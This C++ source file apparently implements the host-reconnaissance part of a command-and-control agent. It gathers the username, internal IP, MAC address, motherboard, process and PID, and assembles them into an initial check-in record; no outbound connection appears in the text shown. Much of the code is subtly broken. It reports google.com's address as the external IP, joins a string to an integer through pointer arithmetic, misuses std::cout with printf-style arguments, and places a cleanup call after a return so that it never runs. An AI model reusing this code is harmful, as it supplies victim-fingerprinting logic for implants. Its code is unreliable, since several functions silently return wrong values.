#define WIN32_LEAN_AND_MEAN
#define WINVER 0x0600
#define _WIN32_WINNT 0x0600

#include "AgentModule.h"
#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <windows.h>
#include <psapi.h>

#include <iostream>
#include <memory>
#include <array>
#include <cmath>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
std::string ConvertLPWSTRToStdString(LPWSTR lpwstr)
{
	if (!lpwstr) return "";	
	int size = WideCharToMultiByte(CP_UTF8, 0, lpwstr, -1, NULL, 0, NULL, NULL);

	if (size <= 0) return "";
	std::string result(size - 1, 0);
	WideCharToMultiByte(CP_UTF8, 0, lpwstr, -1, &result[0], size, NULL, NULL);

	return result;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
std::string AgentModule::CaptureCommandOutput(const std::string& cmd)
{
    std::array<char, 128> buffer;
    std::string result;

    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"), _pclose);

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != NULL)
    {
        result += buffer.data();
    }

    if (!result.empty())
    {
        result.erase(result.find_last_not_of(" \n\r\t") + 1);
    }
    return result;
}

std::string AgentModule::GetMotherBoard()
{
    std::string cmd = "powershell -Command \"(Get-CimInstance Win32_BaseBoard).Product\"";
    std::string name = CaptureCommandOutput(cmd);
    return name;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
AgentModule::AgentModule()
{
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
BOOL AgentModule::GetUsername(OUT LPWSTR* szWhoamiStr)
{
	DWORD dwSize = 0x00;
	BOOL bResult = FALSE;
	
	if (!GetUserNameW(NULL, &dwSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
	{
		std::cout << "[x] GetUserNameW [%d] Failed With Error: %d \n", __LINE__, GetLastError();
		goto _END_OF_FUNC;
	}

	if (!(*szWhoamiStr = (LPWSTR)LocalAlloc(LPTR, dwSize * sizeof(WCHAR))))
	{
		std::cout << "[x] LocalAlloc Failed With Error: %d \n", GetLastError();
		goto _END_OF_FUNC;
	}

	if (!GetUserNameW(*szWhoamiStr, &dwSize))
	{
		std::cout << "[x] GetUserNameW Failed With Error: %d \n", __LINE__, GetLastError();
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (!bResult && *szWhoamiStr)
	{
		LocalFree(*szWhoamiStr);
	}
	return bResult;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
std::string AgentModule::GetInternalIP() {
    ULONG outBufLen = 15000;
    std::vector<BYTE> buffer(outBufLen);
    PIP_ADAPTER_ADDRESSES pAddresses = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());

    // Retrieve network adapter configurations
    DWORD dwRetVal = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &outBufLen);
    
    if (dwRetVal == ERROR_BUFFER_OVERFLOW) {
        buffer.resize(outBufLen);
        pAddresses = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());
        dwRetVal = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &outBufLen);
    }

    if (dwRetVal == NO_ERROR) {
        while (pAddresses) {
            // Ignore loopback and inactive interfaces
            if (pAddresses->IfType != IF_TYPE_SOFTWARE_LOOPBACK && pAddresses->OperStatus == IfOperStatusUp) {
                PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pAddresses->FirstUnicastAddress;
                while (pUnicast) {
                    sockaddr_in* sa_in = reinterpret_cast<sockaddr_in*>(pUnicast->Address.lpSockaddr);
                    char ipStr[INET_ADDRSTRLEN];
                    
                    // Convert IP binary data to a readable string string
                    if (getnameinfo((struct sockaddr*)sa_in, sizeof(sockaddr_in), ipStr, sizeof(ipStr), NULL, 0, NI_NUMERICHOST) == 0) {
                        std::wcout << L"Adapter: " << pAddresses->FriendlyName << L"\n";
                        return ipStr;
                    }
                    pUnicast = pUnicast->Next;
                }
            }
            pAddresses = pAddresses->Next;
        }
    } else {
        std::cerr << "Failed to fetch internal network interfaces.\n";
    }
    return "";
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
std::string AgentModule::GetExternalViaDNS() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return "";

    struct addrinfo hints, *result = NULL;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    DWORD dwRetval = getaddrinfo("www.google.com", NULL, &hints, &result);
    if (dwRetval == 0) {
        struct sockaddr_in* sockaddr_ipv4 = (struct sockaddr_in*)result->ai_addr;
        char ipStr[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &(sockaddr_ipv4->sin_addr), ipStr, INET_ADDRSTRLEN);
        return ipStr;
        freeaddrinfo(result);
    } else {
        std::cerr << "DNS Query Failed." << std::endl;
    }
    WSACleanup();
    return "";
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
std::string AgentModule::GetMachineMacAddress() {
    ULONG bufferSize = 15000; 
    std::vector<BYTE> buffer(bufferSize);
    
    ULONG flags = GAA_FLAG_SKIP_DNS_SERVER | GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST;
    PIP_ADAPTER_ADDRESSES adapterList = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());

    ULONG result = GetAdaptersAddresses(AF_UNSPEC, flags, NULL, adapterList, &bufferSize);
    
    if (result == ERROR_BUFFER_OVERFLOW) {
        buffer.resize(bufferSize);
        adapterList = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());
        result = GetAdaptersAddresses(AF_UNSPEC, flags, NULL, adapterList, &bufferSize);
    }

    if (result == NO_ERROR) {
        for (PIP_ADAPTER_ADDRESSES adapter = adapterList; adapter != NULL; adapter = adapter->Next) {
            if (adapter->OperStatus == IfOperStatusUp && adapter->PhysicalAddressLength == 6) {
                char macBuffer[18];
                snprintf(macBuffer, sizeof(macBuffer), "%02X:%02X:%02X:%02X:%02X:%02X",
                         adapter->PhysicalAddress[0], adapter->PhysicalAddress[1],
                         adapter->PhysicalAddress[2], adapter->PhysicalAddress[3],
                         adapter->PhysicalAddress[4], adapter->PhysicalAddress[5]);
                
                return std::string(macBuffer); 
            }
        }
    }

    return ""; 
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
std::string AgentModule::GetProcessName()
{
    HANDLE hProcess = GetCurrentProcess();
    char buffer[MAX_PATH];

    DWORD size = GetModuleBaseNameA(hProcess, NULL, buffer, MAX_PATH);
    return std::string(buffer, size);
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
int AgentModule::GetPID()
{
    HANDLE hProcess = GetCurrentProcess();
    return GetProcessId(hProcess);
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
int AgentModule::GetOSVersion()
{
    PBYTE pSharedUserData = (PBYTE)0X7FFE0000;
    return *(ULONG*)(pSharedUserData + 0x26C);
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
int AgentModule::GetRAM()
{
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);

    if (GlobalMemoryStatusEx(&memInfo))
    {
        double totalRamBytes = static_cast<double>(memInfo.ullTotalPhys);
        double totalRamGB = totalRamBytes / (1024.0 * 1024.0 * 1024.0);
        return static_cast<int>(std::round(totalRamGB));
    }
    
    return 0;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
IntitalCheckinRequest AgentModule::GetHostInformation()
{
    std::string internalIP;
    std::string externalIP;
    std::string OS;
    LPWSTR username;
    std::string processName;
    int pid;


    GetUsername(&username);
    internalIP = GetInternalIP();
    externalIP = GetExternalViaDNS();
    processName = GetProcessName();
    pid = GetPID();

    return IntitalCheckinRequest
    {
        GetInternalIP(),
        GetExternalViaDNS(),
        "Windows " + GetOSVersion(),
        ConvertLPWSTRToStdString(username),
        GetProcessName(),
        GetPID(),
        "High", // TODO Integrity
        GetMachineMacAddress(),
        GetMotherBoard(),
        16,            // TODO RAM
        512.0,     // TODO disk size
        320.5,     // TODO  free disk
        8 // TODO cpu count
    };
}